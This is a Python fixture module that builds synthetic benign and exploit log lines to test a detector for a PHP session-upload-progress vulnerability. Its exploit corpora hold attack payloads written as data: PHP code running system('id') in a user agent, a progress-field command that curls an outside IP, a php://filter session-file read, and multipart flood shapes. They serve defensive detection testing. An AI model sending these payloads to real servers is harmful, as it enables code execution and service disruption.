"""Synthetic log corpora for php2shell-detector tests and examples.

The EXPLOIT corpora contain ONLY values documented in the research briefs
(technique.md / tracker.md, compiled 2026-10-23 from fetched primary sources);
each generator cites its basis inline. IPs that look real are the brief-documented
attempt sources (VulnCheck Canary / ELLIO), reproduced for realistic corpora.
The BENIGN corpora contain ordinary traffic chosen to trip nothing.

Log-body visibility: bodies are written into a LTSV `body:` field, escaped
(\\r\\n, \\x00) so the LTSV stays line-based; the tool unescapes before scanning.
"""

BOUNDARY_B7K618 = "B7kQpoc618"   # documented PoC/F5 default boundary [S22]
BOUNDARY_B7K619 = "B7kQpoc619"   # documented PoC/F5 default boundary [S22]
BOUNDARY_ATK = "------atk"       # documented ELLIO OOM-tool boundary [tracker 4.3]

CHROME_UA = ("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 "
             "(KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36")
FIREFOX_UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0"
LIVE_CODE_UA = ("php2shellLP<?php echo 'php2shell_out_start';system('id');"
                "echo 'php2shell_out_end';?>")   # F5 appendix, technique.md 10.1
HARDCODED_SESSID_F5 = "a1b2c3d4e5f6a7b8c9d0e1f2a3"        # F5 pattern-3 [S22]
DOC_SESSION_ID_VULNCHECK = "xqsuvwz3n97wu8j3emz1axuo5y"  # VulnCheck canary [S16]
PROGRESS_VALUE_P2S = "p2sprobec982a06c"                   # F5 pattern-1 [S22]
PROGRESS_COMMAND = "system('curl http://15.235.206.16:8443')"  # ELLIO [technique 10.1]


def esc(body: str) -> str:
    """Escape a body so it can live on one LTSV log line (unescaped by the tool)."""
    return (body.replace("\\", "\\\\").replace("\x00", "\\x00")
            .replace("\r", "\\r").replace("\n", "\\n").replace("\t", "\\t"))


def ltsv(fields: dict) -> str:
    return "\t".join(f"{k}:{v}" for k, v in fields.items())


def multipart(boundary: str, parts) -> str:
    chunks = ["--" + boundary + "\r\n" + p for p in parts]
    return "\r\n".join(chunks) + "\r\n--" + boundary + "--"


def form_part(name: str, value: str = "", filename: str = None, extra_headers: int = 0) -> str:
    disp = f'Content-Disposition: form-data; name="{name}"'
    if filename is not None:
        disp += f'; filename="{filename}"'
    lines = [disp]
    for _ in range(extra_headers):
        lines.append("X: a")
    return "\r\n".join(lines) + "\r\n\r\n" + value


# ---------------------------------------------------------------- benign ----

def benign_access_combined():
    return [
        '10.0.0.14 - - [21/Oct/2026:09:00:11 +0000] "GET / HTTP/1.1" 200 10413 "-" "%s"' % CHROME_UA,
        '10.0.0.15 - - [21/Oct/2026:09:00:41 +0000] "POST /wp-login.php HTTP/1.1" 302 210 '
        '"https://www.example.org/login" "%s"' % FIREFOX_UA,
        '10.0.0.16 - - [21/Oct/2026:09:01:02 +0000] "GET /robots.txt HTTP/1.1" 404 153 "-" "curl/8.5.0"',
        '10.0.0.17 - - [21/Oct/2026:09:01:44 +0000] "GET /api/status HTTP/1.1" 200 77 "-" "python-requests/2.31.0"',
        '10.0.0.14 - - [21/Oct/2026:09:02:00 +0000] "GET /blog/page-2 HTTP/1.1" 200 18220 "-" "%s"' % CHROME_UA,
        '10.0.0.16 - - [21/Oct/2026:09:03:01 +0000] "GET /checkout.php HTTP/1.1" 500 530 "-" "curl/8.5.0"',
        '10.0.0.16 - - [21/Oct/2026:09:03:14 +0000] "GET /healthz HTTP/1.1" 500 12 "-" "curl/8.5.0"',
    ]


def benign_access_ltsv():
    benign_body = multipart(BOUNDARY_B7K618, [
        form_part("title", "Quarterly report upload"),
        form_part("tag", "finance"),
        form_part("photo", "\x00\xFF\xD8\xFF\xE0\x11\x22binary jpeg body" + ("j" * 40),
                  filename="photo.jpg"),
    ])
    cookie = "PHPSESSID=9dmqvk1n0bft8u3k4lq2w6xz7a"
    out = []
    for i in range(6):  # repeated same-session posts (no rotation, no progress field)
        out.append(ltsv({
            "host": "2001:db8::1", "time": f"21/Oct/2026:09:0{i}:00", "req": "POST /login.php HTTP/1.1",
            "status": "200", "size": "512", "ua": CHROME_UA, "cookie": cookie,
            "content_length": "1048576", "body": esc(benign_body),
        }))
    out.append(ltsv({
        "host": "10.0.0.17", "time": "21/Oct/2026:09:04:00",
        "req": "GET /download.php?file=/docs/report-2026.pdf HTTP/1.1",
        "status": "200", "size": "441000", "ua": CHROME_UA}))
    out.append(ltsv({
        "host": "10.0.0.17", "time": "21/Oct/2026:09:05:00", "req": "POST /api/v1/upload HTTP/1.1",
        "status": "200", "size": "441000", "ua": CHROME_UA, "request_length": "441373"}))
    return out


def benign_php_error():
    return [
        "[21-Oct-2026 09:15:02 UTC] PHP Notice:  Undefined index: theme in /var/www/html/footer.php on line 12",
        "[21-Oct-2026 09:15:03 UTC] PHP Notice:  Undefined offset: 0 in /var/www/html/footer.php on line 19",
    ]


# --------------------------------------------------------------- exploit ----

def exploit_access_combined():
    return [
        # VulnCheck canary 08:37 UTC 21 Oct: 85.11.167.243 multipart POST /index.php (tracker 4.3)
        '85.11.167.243 - - [21/Oct/2026:08:37:01 +0000] "POST /index.php HTTP/1.1" 200 331 "-" "php2shell-scan/109618"',
        # VulnCheck 109.71.252.97: probe sweep, UA as published (technique 10.1)
        '109.71.252.97 - - [21/Oct/2026:10:12:22 +0000] "GET /phpinfo.php HTTP/1.1" 404 153 "-" '
        '"php2shell-scan/1.3 (eigen-oppervlak controle; CVE-2026-109618/109619)"',
        # VulnCheck 91.90.123.25: verify probe (technique 10.1)
        '91.90.123.25 - - [21/Oct/2026:17:24:40 +0000] "GET / HTTP/1.1" 200 511 "-" "php2shell-verify/1.0"',
        # VulnCheck 45.198.224.169 (weaponized-attempt source in the briefs)
        '45.198.224.169 - - [21/Oct/2026:14:15:02 +0000] "POST /upload.php HTTP/1.1" 200 12 "-" "Mozilla/5.0 (php2shell-poc)"',
        # F5 appendix: UA embedding live PHP code
        '10.9.9.9 - - [21/Oct/2026:15:00:00 +0000] "GET / HTTP/1.1" 200 431 "-" "%s"' % LIVE_CODE_UA,
        # VulnCheck 221.14.159.134: upload-progress webshell plant + php://filter session reads (all 404)
        '221.14.159.134 - - [21/Oct/2026:17:22:10 +0000] '
        '"GET /download.php?file=php://filter/convert.base64-encode/resource=/var/lib/php/sessions/sess_%s HTTP/1.1" 404 153 "-" "curl/8.5.0"'
        % DOC_SESSION_ID_VULNCHECK,
        # ELLIO 06:xx UTC: 6 x 500 on one path (side-effect shape, technique 10.3)
        *[f"10.9.9.10 - - [21/Oct/2026:1{k}:{i}:02 +0000] \"POST /tools/search.php HTTP/1.1\" 500 1530 \"-\" \"{CHROME_UA}\""
          for k, i in [(6, 1), (6, 2), (6, 3), (6, 4), (6, 5), (6, 6)]],
    ]


def exploit_access_ltsv():
    out = []
    # 1) session-path probe: boundary ------atk + progress field + documented value
    body_probe = multipart(BOUNDARY_ATK, [form_part(
        "PHP_SESSION_UPLOAD_PROGRESS", PROGRESS_VALUE_P2S)])
    out.append(ltsv({"host": "10.9.9.1", "time": "21/Oct/2026:16:05:01",
                     "req": "POST /upload.php HTTP/1.1", "status": "200", "size": "98",
                     "ua": "php2shell-scan/109618", "body": esc(body_probe)}))
    # 2) empty-file part flood (hundreds) at documented boundary B7kQpoc618
    body_empty = multipart(BOUNDARY_B7K618,
                           [form_part("f%03d" % i, "", filename="") for i in range(120)])
    out.append(ltsv({"host": "10.9.9.2", "time": "21/Oct/2026:16:05:30",
                     "req": "POST /contact.php HTTP/1.1", "status": "200", "size": "0",
                     "ua": CHROME_UA, "content_length": "9460", "body": esc(body_empty)}))
    # 3) deep field nesting (dozens of levels -> 15)
    body_nest = multipart(BOUNDARY_ATK, [form_part("a" + "[0]" * 15, "x")])
    out.append(ltsv({"host": "10.9.9.2", "time": "21/Oct/2026:16:06:10",
                     "req": "POST /api/import HTTP/1.1", "status": "200", "size": "0",
                     "ua": CHROME_UA, "body": esc(body_nest)}))
    # 4) header flood inside one part (1,200 'X: a' lines)
    body_hdr = multipart(BOUNDARY_ATK, [form_part("big", "x", extra_headers=1200)])
    out.append(ltsv({"host": "10.9.9.3", "time": "21/Oct/2026:16:06:50",
                     "req": "POST /notes.php HTTP/1.1", "status": "200", "size": "0",
                     "ua": CHROME_UA, "body": esc(body_hdr)}))
    # 5) padding flood: 63,000-byte identical-character run
    body_pad = multipart(BOUNDARY_B7K618, [form_part("pad", "A" * 63000)])
    out.append(ltsv({"host": "10.9.9.3", "time": "21/Oct/2026:16:07:20",
                     "req": "POST /pads.php HTTP/1.1", "status": "200", "size": "0",
                     "ua": CHROME_UA, "body": esc(body_pad)}))
    # 6) identical small-parts battery (weaponized PoC shape: N identical short parts)
    body_battery = multipart(BOUNDARY_ATK, [form_part("p1", "A" * 262 + "9" * 26)
                                            for _ in range(70)])
    out.append(ltsv({"host": "10.9.9.4", "time": "21/Oct/2026:16:08:01",
                     "req": "POST /index.php HTTP/1.1", "status": "200", "size": "0",
                     "ua": CHROME_UA, "body": esc(body_battery)}))
    # 7) all-NUL short file part (heap-grooming file shape, F5)
    body_null = multipart(BOUNDARY_B7K619, [form_part("f", "\x00\x00", filename="x.txt")])
    out.append(ltsv({"host": "10.9.9.5", "time": "21/Oct/2026:16:09:00",
                     "req": "POST /avatar.php HTTP/1.1", "status": "200", "size": "0",
                     "ua": CHROME_UA, "body": esc(body_null)}))
    # 8) untrusted Content-Length: declared 1,000 vs logged body ~5,000
    body_blob = multipart(BOUNDARY_B7K618, [form_part("blob", "B" * 5000)])
    out.append(ltsv({"host": "10.9.9.6", "time": "21/Oct/2026:16:10:00",
                     "req": "POST /import.php HTTP/1.1", "status": "200", "size": "0",
                     "ua": CHROME_UA, "content_length": "1000", "body": esc(body_blob)}))
    # 9) missing content length with a body present
    out.append(ltsv({"host": "10.9.9.6", "time": "21/Oct/2026:16:10:30",
                     "req": "POST /import.php HTTP/1.1", "status": "200", "size": "0",
                     "ua": CHROME_UA, "content_length": "-", "body": esc(body_blob)}))
    # 10) documented OOM body-size cluster via request_length (exact 8 MiB value)
    out.append(ltsv({"host": "10.9.9.7", "time": "21/Oct/2026:16:11:00",
                     "req": "POST /upload.php HTTP/1.1", "status": "500", "size": "0",
                     "ua": CHROME_UA, "request_length": "8388608"}))
    # 11) progress field with a live command value (ELLIO)
    body_cmd = multipart(BOUNDARY_ATK, [form_part("PHP_SESSION_UPLOAD_PROGRESS", PROGRESS_COMMAND)])
    out.append(ltsv({"host": "10.9.9.8", "time": "21/Oct/2026:16:12:00",
                     "req": "POST /index.php HTTP/1.1", "status": "200", "size": "0",
                     "ua": CHROME_UA, "body": esc(body_cmd)}))
    # 12) hardcoded PHPSESSID from F5 pattern 3
    out.append(ltsv({"host": "10.9.9.9", "time": "21/Oct/2026:16:13:00",
                     "req": "POST /wp-admin/admin-ajax.php HTTP/1.1", "status": "200", "size": "0",
                     "ua": CHROME_UA, "cookie": "PHPSESSID=" + HARDCODED_SESSID_F5}))
    # 13)-(18) heap-grooming cadence: minimal progress triggers, rotating sessions, same endpoint
    for n in range(6):
        tiny = multipart(BOUNDARY_B7K618, [form_part("PHP_SESSION_UPLOAD_PROGRESS", PROGRESS_VALUE_P2S)])
        out.append(ltsv({"host": "10.9.9.10", "time": f"21/Oct/2026:17:{n}:00",
                         "req": "POST /session.php HTTP/1.1", "status": "200", "size": "0",
                         "ua": CHROME_UA,
                         "cookie": f"PHPSESSID=cafecafe000000{n:06x}",
                         "body": esc(tiny)}))
    return out


def exploit_php_error():
    return [
        # memory-limit fatal (technique 10.3 [S8, S24]; 109619 producer class [S2])
        "[21-Oct-2026 16:06:11 UTC] PHP Fatal error:  Allowed memory size of 16777216 bytes "
        "exhausted (tried to allocate 32768 bytes) in Unknown on line 0",
        # 'Maximum execution time exceeded' - documented 109619 producer [technique 2.2]
        "[21-Oct-2026 16:06:40 UTC] PHP Fatal error:  Maximum execution time of 30 seconds "
        "exceeded in /var/www/html/includes/upload.php on line 118",
        # worker crash / churn [technique 10.3: FPM killed children, mod_php segfaults]
        "[21-Oct-2026 16:07:02 UTC] WARNING: [pool www] child 4472 exited on signal 11 (SIGSEGV) "
        "after 12.3 seconds from start",
        "[21-Oct-2026 16:07:05 UTC] WARNING: [pool www] child 4473 exited on signal 6 (SIGABRT) "
        "after 1.1 seconds from start",
        "[21-Oct-2026 16:07:08 UTC] WARNING: [pool www] child 4474 exited on signal 11 (SIGSEGV) "
        "after 0.9 seconds from start",
        # pre-request INI diagnostics - consumer touchpoint class [technique 2.2]
        "[21-Oct-2026 16:07:30 UTC] PHP Warning:  PHP Startup: Unable to load dynamic library "
        "'intl.so' (tried: /usr/lib/php/20230902/intl.so) in Unknown on line 0",
        "[21-Oct-2026 16:07:34 UTC] PHP Deprecated:  Action on empty result is deprecated "
        "in /var/www/html/legacy/forms.php on line 9",
        # documented marker strings reaching a PHP log
        "[21-Oct-2026 16:07:50 UTC] PHP Notice:  system('uname -a; id; echo JACKALPOC') in "
        "/var/www/html/tmp/index.php on line 1",
    ]


def all_benign_lines():
    return benign_access_combined() + benign_access_ltsv()


def all_exploit_lines():
    return (exploit_access_combined() + exploit_access_ltsv() + exploit_php_error())